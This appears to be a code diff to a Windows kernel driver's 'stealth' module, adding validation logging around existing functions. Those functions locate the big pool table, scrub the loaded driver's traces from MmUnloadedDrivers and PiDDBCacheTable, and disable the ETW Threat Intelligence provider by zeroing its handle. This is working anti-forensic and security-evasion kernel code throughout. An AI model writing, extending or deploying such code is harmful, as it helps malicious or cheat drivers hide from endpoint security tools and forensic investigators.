@@ -735,17 +735,26 @@ namespace stealth {
     }
 
     inline bool ResolveBigPoolTableWin11(PVOID ntBase) {
-        if (!ntBase || !_MmIsAddressValid(ntBase))
+        if (!ntBase || !_MmIsAddressValid(ntBase)) {
+            WW_KERNEL_PATTERN_LOG_PTR("PoolBigPageTable.Win11", "semantic_scan", "win11_bigpool_globals", nullptr, FALSE,
+                "ntoskrnl base pointer missing or invalid", "bad_nt_base");
             return false;
+        }
 
         PIMAGE_DOS_HEADER dos = static_cast<PIMAGE_DOS_HEADER>(ntBase);
-        if (dos->e_magic != IMAGE_DOS_SIGNATURE)
+        if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
+            WW_KERNEL_PATTERN_LOG_PTR("PoolBigPageTable.Win11", "semantic_scan", "win11_bigpool_globals", nullptr, FALSE,
+                "ntoskrnl DOS signature invalid", "bad_dos_header");
             return false;
+        }
 
         PIMAGE_NT_HEADERS64 nt = reinterpret_cast<PIMAGE_NT_HEADERS64>(
             static_cast<UCHAR*>(ntBase) + dos->e_lfanew);
-        if (!_MmIsAddressValid(nt) || nt->Signature != IMAGE_NT_SIGNATURE)
+        if (!_MmIsAddressValid(nt) || nt->Signature != IMAGE_NT_SIGNATURE) {
+            WW_KERNEL_PATTERN_LOG_PTR("PoolBigPageTable.Win11", "semantic_scan", "win11_bigpool_globals", nullptr, FALSE,
+                "ntoskrnl NT signature invalid", "bad_nt_headers");
             return false;
+        }
 
         static const UCHAR patWin11[] = {
             0x48, 0x8B, 0x15, 0x00, 0x00, 0x00, 0x00,
@@ -834,6 +843,17 @@ namespace stealth {
         }
 
         if (validCandidates != 1 || !selectedTablePtr || !selectedSizePtr || !selectedTable || selectedSize == 0) {
+            WW_LOG("KVALIDATE build=%lu kind=pattern name=PoolBigPageTable.Win11 source=semantic_scan pattern=win11_bigpool_globals value=%p validation=fail evidence=\"raw=%lu valid=%lu selected_found=%p table_ptr=%p size_ptr=%p table=%p size=%llu sections=%u\" fail_closed=ambiguous_or_missing_candidate",
+                ww_kernel_validation_build(),
+                selectedTablePtr,
+                rawCandidates,
+                validCandidates,
+                selectedFound,
+                selectedTablePtr,
+                selectedSizePtr,
+                selectedTable,
+                static_cast<unsigned long long>(selectedSize),
+                nt->FileHeader.NumberOfSections);
             WW_LOG("stealth::ResolveBigPoolTableWin11 fail_closed raw=%lu valid=%lu selected_found=%p table_ptr=%p size_ptr=%p table=%p size=%llu build=%lu",
                 rawCandidates,
                 validCandidates,
@@ -849,6 +869,17 @@ namespace stealth {
         g_PoolBigPageTable = reinterpret_cast<PPOOL_TRACKER_BIG_PAGES*>(selectedTablePtr);
         g_PoolBigPageTableSize = selectedSizePtr;
         g_BigPoolEntryStride = 0x20;
+        WW_LOG("KVALIDATE build=%lu kind=layout name=PoolBigPageTable.Win11 source=semantic_scan offset=0x%llx validation=pass evidence=\"found=%p table_ptr=%p size_ptr=%p table=%p size=%llu stride=0x%llx raw=%lu valid=%lu\" fail_closed=none",
+            ww_kernel_validation_build(),
+            static_cast<unsigned long long>(reinterpret_cast<ULONG_PTR>(selectedTablePtr) - reinterpret_cast<ULONG_PTR>(ntBase)),
+            selectedFound,
+            selectedTablePtr,
+            selectedSizePtr,
+            selectedTable,
+            static_cast<unsigned long long>(selectedSize),
+            static_cast<unsigned long long>(g_BigPoolEntryStride),
+            rawCandidates,
+            validCandidates);
         WW_LOG("stealth::ResolveBigPoolTableWin11 selected found=%p table_ptr=%p size_ptr=%p table=%p size=%llu stride=0x%llx raw=%lu",
             selectedFound,
             selectedTablePtr,
@@ -879,10 +910,14 @@ namespace stealth {
         SIZE_T secCheckSz[1];
         if (!GetExecutableSections(ntBase, secCheck, secCheckSz, 1)) {
             _InterlockedExchange(&g_BigPoolResolved, 2);
+            WW_KERNEL_PATTERN_LOG_PTR("PoolBigPageTable", "semantic_scan", "executable_sections", nullptr, FALSE,
+                "no executable ntoskrnl sections available for pattern scan", "no_executable_sections");
             return false;
         }
 
         if (!IsNtBuildKnown()) {
+            WW_KERNEL_PATTERN_LOG_PTR("PoolBigPageTable", "semantic_scan", "build_gated", nullptr, FALSE,
+                "nt build number could not be resolved", "unknown_nt_build");
             WW_LOG("stealth::ResolveBigPoolTable fail_closed reason=unknown_nt_build");
             _InterlockedExchange(&g_BigPoolResolved, 2);
             return false;
@@ -901,12 +936,14 @@ namespace stealth {
         };
 
         PVOID found = FindPatternInAllSections(ntBase, patBigPool, "xxx????xxx");
+        const char* table_pattern = found ? "patBigPool" : "none";
         if (!found) {
             static const UCHAR patBigPoolAlt[] = {
                 0x4C, 0x8B, 0x25, 0x00, 0x00, 0x00, 0x00,
                 0x4D, 0x85, 0xE4
             };
             found = FindPatternInAllSections(ntBase, patBigPoolAlt, "xxx????xxx");
+            if (found) table_pattern = "patBigPoolAlt";
         }
 
         if (found) {
@@ -921,6 +958,7 @@ namespace stealth {
         };
 
         found = FindPatternInAllSections(ntBase, patSize, "xxx????");
+        const char* size_pattern = found ? "patSize" : "none";
         if (found) {
             PVOID resolved = ResolveRelative(found, 3, 7);
             if (resolved && _MmIsAddressValid(resolved)) {
@@ -934,6 +972,7 @@ namespace stealth {
             };
 
             found = FindPatternInAllSections(ntBase, patSizeAlt, "xx????");
+            if (found) size_pattern = "patSizeAlt";
             if (found) {
                 PVOID resolved = ResolveRelative(found, 2, 6);
                 if (resolved && _MmIsAddressValid(resolved)) {
@@ -945,6 +984,18 @@ namespace stealth {
         KeMemoryBarrier();
         _InterlockedExchange(&g_BigPoolResolved, 2);
 
+        BOOLEAN valid = (g_PoolBigPageTable != nullptr);
+        WW_LOG("KVALIDATE build=%lu kind=layout name=PoolBigPageTable source=semantic_scan offset=0x%llx validation=%s evidence=\"table_pattern=%s size_pattern=%s table_ptr=%p size_ptr=%p first_section=%p first_section_size=0x%llx\" fail_closed=%s",
+            ww_kernel_validation_build(),
+            g_PoolBigPageTable ? static_cast<unsigned long long>(reinterpret_cast<ULONG_PTR>(g_PoolBigPageTable) - reinterpret_cast<ULONG_PTR>(ntBase)) : 0ull,
+            ww_kernel_validation_state(valid),
+            table_pattern,
+            size_pattern,
+            g_PoolBigPageTable,
+            g_PoolBigPageTableSize,
+            secCheck[0],
+            static_cast<unsigned long long>(secCheckSz[0]),
+            valid ? "none" : "table_pattern_not_found_or_invalid");
         return (g_PoolBigPageTable != nullptr);
     }
 
@@ -1027,11 +1078,15 @@ namespace stealth {
 
     inline bool CleanMmUnloadedDrivers(PVOID ntBase) {
         if (!IsNtBuildKnown()) {
+            WW_KERNEL_PATTERN_LOG_PTR("MmUnloadedDrivers", "semantic_scan", "build_gated", nullptr, FALSE,
+                "nt build number could not be resolved", "unknown_nt_build");
             WW_LOG("stealth::CleanMmUnloadedDrivers fail_closed reason=unknown_nt_build");
             return false;
         }
 
         if (IsWindows11()) {
+            WW_KERNEL_PATTERN_LOG_PTR("MmUnloadedDrivers", "semantic_scan", "legacy_patterns", nullptr, FALSE,
+                "Windows 11 write path intentionally unverified", "mm_unloaded_write_path_unverified");
             WW_LOG("stealth::CleanMmUnloadedDrivers fail_closed_windows11 build=%lu reason=mm_unloaded_write_path_unverified",
                 GetNtBuildNumber());
             return false;
@@ -1058,14 +1113,21 @@ namespace stealth {
         };
 
         PVOID found = FindPatternInAllSections(ntBase, pat1, "xxx????xxx");
+        const char* pattern_name = found ? "pat1" : "none";
         if (!found)
             found = FindPatternInAllSections(ntBase, pat2, "xx?????xxxxx?x");
+        if (found && pattern_name[0] == 'n') pattern_name = "pat2";
         if (!found)
             found = FindPatternInAllSections(ntBase, pat3, "xxx????xxx");
+        if (found && pattern_name[0] == 'n') pattern_name = "pat3";
         if (!found)
             found = FindPatternInAllSections(ntBase, pat4, "xxx????xxx");
-        if (!found)
+        if (found && pattern_name[0] == 'n') pattern_name = "pat4";
+        if (!found) {
+            WW_KERNEL_PATTERN_LOG_PTR("MmUnloadedDrivers", "semantic_scan", "legacy_patterns", nullptr, FALSE,
+                "pat1/pat2/pat3/pat4 did not match executable ntoskrnl sections", "pattern_not_found");
             return false;
+        }
 
         int dispOffset = 3;
         if (*(UCHAR*)found == 0x48) {
@@ -1075,12 +1137,28 @@ namespace stealth {
         }
 
         PVOID pMmUnloadedDrivers = ResolveRelative(found, dispOffset, 7);
-        if (!pMmUnloadedDrivers || !_MmIsAddressValid(pMmUnloadedDrivers))
+        if (!pMmUnloadedDrivers || !_MmIsAddressValid(pMmUnloadedDrivers)) {
+            WW_LOG("KVALIDATE build=%lu kind=pattern name=MmUnloadedDrivers source=semantic_scan pattern=%s value=%p validation=fail evidence=\"found=%p disp=%d resolved=%p\" fail_closed=resolved_pointer_invalid",
+                ww_kernel_validation_build(),
+                pattern_name,
+                pMmUnloadedDrivers,
+                found,
+                dispOffset,
+                pMmUnloadedDrivers);
             return false;
+        }
 
         PMM_UNLOADED_DRIVER arr = *reinterpret_cast<PMM_UNLOADED_DRIVER*>(pMmUnloadedDrivers);
-        if (!arr || !_MmIsAddressValid(arr))
+        if (!arr || !_MmIsAddressValid(arr)) {
+            WW_LOG("KVALIDATE build=%lu kind=layout name=MmUnloadedDrivers source=semantic_scan offset=0x%llx validation=fail evidence=\"pattern=%s found=%p global=%p array=%p\" fail_closed=array_pointer_invalid",
+                ww_kernel_validation_build(),
+                static_cast<unsigned long long>(reinterpret_cast<ULONG_PTR>(pMmUnloadedDrivers) - reinterpret_cast<ULONG_PTR>(ntBase)),
+                pattern_name,
+                found,
+                pMmUnloadedDrivers,
+                arr);
             return false;
+        }
 
         if (!g_MmUnloadedDriversLock) {
             for (int off = 0x10; off < 0x100; off++) {
@@ -1130,23 +1208,41 @@ namespace stealth {
             _KeLeaveCriticalRegion();
         }
 
+        WW_LOG("KVALIDATE build=%lu kind=layout name=MmUnloadedDrivers source=semantic_scan offset=0x%llx validation=%s evidence=\"pattern=%s found=%p global=%p array=%p lock=%p modified=%u max_entries=50\" fail_closed=%s",
+            ww_kernel_validation_build(),
+            static_cast<unsigned long long>(reinterpret_cast<ULONG_PTR>(pMmUnloadedDrivers) - reinterpret_cast<ULONG_PTR>(ntBase)),
+            ww_kernel_validation_state(modified ? TRUE : FALSE),
+            pattern_name,
+            found,
+            pMmUnloadedDrivers,
+            arr,
+            g_MmUnloadedDriversLock,
+            modified ? 1u : 0u,
+            modified ? "none" : "no_matching_entries_modified");
         return modified;
     }
 
     inline bool CleanKernelHashBucketList(PVOID ntBase, UNICODE_STRING* driverName) {
         if (!IsNtBuildKnown()) {
+            WW_KERNEL_PATTERN_LOG_PTR("PiDDBCacheTable", "semantic_scan", "build_gated", nullptr, FALSE,
+                "nt build number could not be resolved", "unknown_nt_build");
             WW_LOG("stealth::CleanKernelHashBucketList fail_closed reason=unknown_nt_build");
             return false;
         }
 
         if (IsWindows11()) {
+            WW_KERNEL_PATTERN_LOG_PTR("PiDDBCacheTable", "semantic_scan", "legacy_patterns", nullptr, FALSE,
+                "Windows 11 hash bucket write path intentionally unverified", "hash_bucket_write_path_unverified");
             WW_LOG("stealth::CleanKernelHashBucketList fail_closed_windows11 build=%lu reason=hash_bucket_write_path_unverified",
                 GetNtBuildNumber());
             return false;
         }
 
-        if (!driverName || !driverName->Buffer || driverName->Length == 0)
+        if (!driverName || !driverName->Buffer || driverName->Length == 0) {
+            WW_KERNEL_PATTERN_LOG_PTR("PiDDBCacheTable", "semantic_scan", "legacy_patterns", nullptr, FALSE,
+                "driver name unavailable for hash bucket validation", "missing_driver_name");
             return false;
+        }
 
         static const UCHAR pat1[] = {
             0x48, 0x8B, 0x1D, 0x00, 0x00, 0x00, 0x00,
@@ -1171,28 +1267,43 @@ namespace stealth {
 
         PVOID found = FindPatternInAllSections(ntBase, pat1, "xxx????x?xx");
         bool isMov = true;
+        const char* pattern_name = found ? "pat1" : "none";
 
         if (!found) {
             found = FindPatternInAllSections(ntBase, pat2, "xxx????x????xxxx?xxx");
             isMov = false;
+            if (found) pattern_name = "pat2";
         }
 
         if (!found) {
             found = FindPatternInAllSections(ntBase, pat3, "xxx????xxx");
             isMov = true;
+            if (found) pattern_name = "pat3";
         }
 
         if (!found) {
             found = FindPatternInAllSections(ntBase, pat4, "xxx????xxx");
             isMov = true;
+            if (found) pattern_name = "pat4";
         }
 
-        if (!found)
+        if (!found) {
+            WW_KERNEL_PATTERN_LOG_PTR("PiDDBCacheTable", "semantic_scan", "legacy_patterns", nullptr, FALSE,
+                "pat1/pat2/pat3/pat4 did not match executable ntoskrnl sections", "pattern_not_found");
             return false;
+        }
 
         PVOID resolved = ResolveRelative(found, 3, 7);
-        if (!resolved || !_MmIsAddressValid(resolved))
+        if (!resolved || !_MmIsAddressValid(resolved)) {
+            WW_LOG("KVALIDATE build=%lu kind=pattern name=PiDDBCacheTable source=semantic_scan pattern=%s value=%p validation=fail evidence=\"found=%p is_mov=%u resolved=%p\" fail_closed=resolved_pointer_invalid",
+                ww_kernel_validation_build(),
+                pattern_name,
+                resolved,
+                found,
+                isMov ? 1u : 0u,
+                resolved);
             return false;
+        }
 
         PLIST_ENTRY listHead = nullptr;
 
@@ -1207,8 +1318,17 @@ namespace stealth {
         }
 
         if (!listHead || !_MmIsAddressValid(listHead) ||
-            !listHead->Flink || !_MmIsAddressValid(listHead->Flink))
+            !listHead->Flink || !_MmIsAddressValid(listHead->Flink)) {
+            WW_LOG("KVALIDATE build=%lu kind=layout name=PiDDBCacheTable source=semantic_scan offset=0x%llx validation=fail evidence=\"pattern=%s found=%p resolved=%p list=%p is_mov=%u\" fail_closed=list_head_invalid",
+                ww_kernel_validation_build(),
+                static_cast<unsigned long long>(reinterpret_cast<ULONG_PTR>(resolved) - reinterpret_cast<ULONG_PTR>(ntBase)),
+                pattern_name,
+                found,
+                resolved,
+                listHead,
+                isMov ? 1u : 0u);
             return false;
+        }
 
         bool cleaned = false;
         PLIST_ENTRY cur = listHead->Flink;
@@ -1245,27 +1365,49 @@ namespace stealth {
             cur = next;
         }
 
+        WW_LOG("KVALIDATE build=%lu kind=layout name=PiDDBCacheTable source=semantic_scan offset=0x%llx validation=%s evidence=\"pattern=%s found=%p resolved=%p list=%p is_mov=%u cleaned=%u safety_initial=512\" fail_closed=%s",
+            ww_kernel_validation_build(),
+            static_cast<unsigned long long>(reinterpret_cast<ULONG_PTR>(resolved) - reinterpret_cast<ULONG_PTR>(ntBase)),
+            ww_kernel_validation_state(cleaned ? TRUE : FALSE),
+            pattern_name,
+            found,
+            resolved,
+            listHead,
+            isMov ? 1u : 0u,
+            cleaned ? 1u : 0u,
+            cleaned ? "none" : "target_entry_not_found");
         return cleaned;
     }
 
     inline bool DisableEtwThreatIntel(PVOID ntBase) {
-        if (!ntBase)
+        if (!ntBase) {
+            WW_KERNEL_PATTERN_LOG_PTR("EtwThreatIntelProvider", "semantic_scan", "threatintel_provider", nullptr, FALSE,
+                "ntoskrnl base pointer missing", "bad_nt_base");
             return false;
+        }
 
         if (!IsNtBuildKnown()) {
+            WW_KERNEL_PATTERN_LOG_PTR("EtwThreatIntelProvider", "semantic_scan", "build_gated", nullptr, FALSE,
+                "nt build number could not be resolved", "unknown_nt_build");
             WW_LOG("stealth::DisableEtwThreatIntel fail_closed reason=unknown_nt_build");
             return false;
         }
 
         if (IsWindows11()) {
             PIMAGE_DOS_HEADER dos = static_cast<PIMAGE_DOS_HEADER>(ntBase);
-            if (!_MmIsAddressValid(dos) || dos->e_magic != IMAGE_DOS_SIGNATURE)
+            if (!_MmIsAddressValid(dos) || dos->e_magic != IMAGE_DOS_SIGNATURE) {
+                WW_KERNEL_PATTERN_LOG_PTR("EtwThreatIntelProvider.Win11", "semantic_scan", "win11_provider_handle", nullptr, FALSE,
+                    "ntoskrnl DOS signature invalid", "bad_dos_header");
                 return false;
+            }
 
             PIMAGE_NT_HEADERS64 nt = reinterpret_cast<PIMAGE_NT_HEADERS64>(
                 static_cast<UCHAR*>(ntBase) + dos->e_lfanew);
-            if (!_MmIsAddressValid(nt) || nt->Signature != IMAGE_NT_SIGNATURE)
+            if (!_MmIsAddressValid(nt) || nt->Signature != IMAGE_NT_SIGNATURE) {
+                WW_KERNEL_PATTERN_LOG_PTR("EtwThreatIntelProvider.Win11", "semantic_scan", "win11_provider_handle", nullptr, FALSE,
+                    "ntoskrnl NT signature invalid", "bad_nt_headers");
                 return false;
+            }
 
             static const UCHAR patWin11[] = {
                 0x48, 0x8B, 0x0D, 0x00, 0x00, 0x00, 0x00,
@@ -1328,6 +1470,13 @@ namespace stealth {
             }
 
             if (validCandidates != 1 || !selectedHandle) {
+                WW_LOG("KVALIDATE build=%lu kind=pattern name=EtwThreatIntelProvider.Win11 source=semantic_scan pattern=win11_provider_handle value=%p validation=fail evidence=\"raw=%lu valid=%lu selected=%p sections=%u\" fail_closed=ambiguous_or_missing_candidate",
+                    ww_kernel_validation_build(),
+                    selectedHandle,
+                    rawCandidates,
+                    validCandidates,
+                    selectedHandle,
+                    nt->FileHeader.NumberOfSections);
                 WW_LOG("stealth::DisableEtwThreatIntel fail_closed_windows11 raw=%lu valid=%lu selected=%p build=%lu",
                     rawCandidates,
                     validCandidates,
@@ -1337,6 +1486,13 @@ namespace stealth {
             }
 
             if (selectedValue == 0) {
+                WW_LOG("KVALIDATE build=%lu kind=layout name=EtwThreatIntelProvider.Win11 source=semantic_scan offset=0x%llx validation=pass evidence=\"found=%p handle=%p current=0 raw=%lu valid=%lu\" fail_closed=none",
+                    ww_kernel_validation_build(),
+                    static_cast<unsigned long long>(reinterpret_cast<ULONG_PTR>(selectedHandle) - reinterpret_cast<ULONG_PTR>(ntBase)),
+                    selectedFound,
+                    selectedHandle,
+                    rawCandidates,
+                    validCandidates);
                 WW_LOG("stealth::DisableEtwThreatIntel already_disabled_windows11 found=%p handle=%p build=%lu",
                     selectedFound,
                     selectedHandle,
@@ -1346,6 +1502,17 @@ namespace stealth {
 
             ULONG64 zeroHandle = 0;
             bool writeOk = SafeWriteMemory(selectedHandle, &zeroHandle, sizeof(zeroHandle));
+            WW_LOG("KVALIDATE build=%lu kind=layout name=EtwThreatIntelProvider.Win11 source=semantic_scan offset=0x%llx validation=%s evidence=\"found=%p handle=%p old=0x%llx raw=%lu valid=%lu write_ok=%u\" fail_closed=%s",
+                ww_kernel_validation_build(),
+                static_cast<unsigned long long>(reinterpret_cast<ULONG_PTR>(selectedHandle) - reinterpret_cast<ULONG_PTR>(ntBase)),
+                ww_kernel_validation_state(writeOk ? TRUE : FALSE),
+                selectedFound,
+                selectedHandle,
+                static_cast<unsigned long long>(selectedValue),
+                rawCandidates,
+                validCandidates,
+                writeOk ? 1u : 0u,
+                writeOk ? "none" : "safe_write_failed");
             WW_LOG("stealth::DisableEtwThreatIntel write_windows11 found=%p handle=%p old=0x%llx ok=%u build=%lu",
                 selectedFound,
                 selectedHandle,
@@ -1370,8 +1537,16 @@ namespace stealth {
             PVOID provHandle = ResolveRelative(found, 3, 8);
             if (provHandle && _MmIsAddressValid(provHandle)) {
                 ULONG64 zeroHandle = 0;
-                SafeWriteMemory(provHandle, &zeroHandle, sizeof(zeroHandle));
-                return true;
+                bool ok = SafeWriteMemory(provHandle, &zeroHandle, sizeof(zeroHandle));
+                WW_LOG("KVALIDATE build=%lu kind=layout name=EtwThreatIntelProvider source=semantic_scan offset=0x%llx validation=%s evidence=\"pattern=patThreatInt found=%p handle=%p write_ok=%u\" fail_closed=%s",
+                    ww_kernel_validation_build(),
+                    static_cast<unsigned long long>(reinterpret_cast<ULONG_PTR>(provHandle) - reinterpret_cast<ULONG_PTR>(ntBase)),
+                    ww_kernel_validation_state(ok ? TRUE : FALSE),
+                    found,
+                    provHandle,
+                    ok ? 1u : 0u,
+                    ok ? "none" : "safe_write_failed");
+                return ok;
             }
         }
 
@@ -1380,11 +1555,21 @@ namespace stealth {
             PVOID provReg = ResolveRelative(found, 3, 7);
             if (provReg && _MmIsAddressValid(provReg)) {
                 ULONG64 zero = 0;
-                SafeWriteMemory(provReg, &zero, sizeof(zero));
-                return true;
+                bool ok = SafeWriteMemory(provReg, &zero, sizeof(zero));
+                WW_LOG("KVALIDATE build=%lu kind=layout name=EtwThreatIntelProvider source=semantic_scan offset=0x%llx validation=%s evidence=\"pattern=patThreatIntAlt found=%p handle=%p write_ok=%u\" fail_closed=%s",
+                    ww_kernel_validation_build(),
+                    static_cast<unsigned long long>(reinterpret_cast<ULONG_PTR>(provReg) - reinterpret_cast<ULONG_PTR>(ntBase)),
+                    ww_kernel_validation_state(ok ? TRUE : FALSE),
+                    found,
+                    provReg,
+                    ok ? 1u : 0u,
+                    ok ? "none" : "safe_write_failed");
+                return ok;
             }
         }
 
+        WW_KERNEL_PATTERN_LOG_PTR("EtwThreatIntelProvider", "semantic_scan", "legacy_patterns", nullptr, FALSE,
+            "patThreatInt and patThreatIntAlt did not resolve a valid provider handle", "pattern_not_found");
         return false;
     }
 
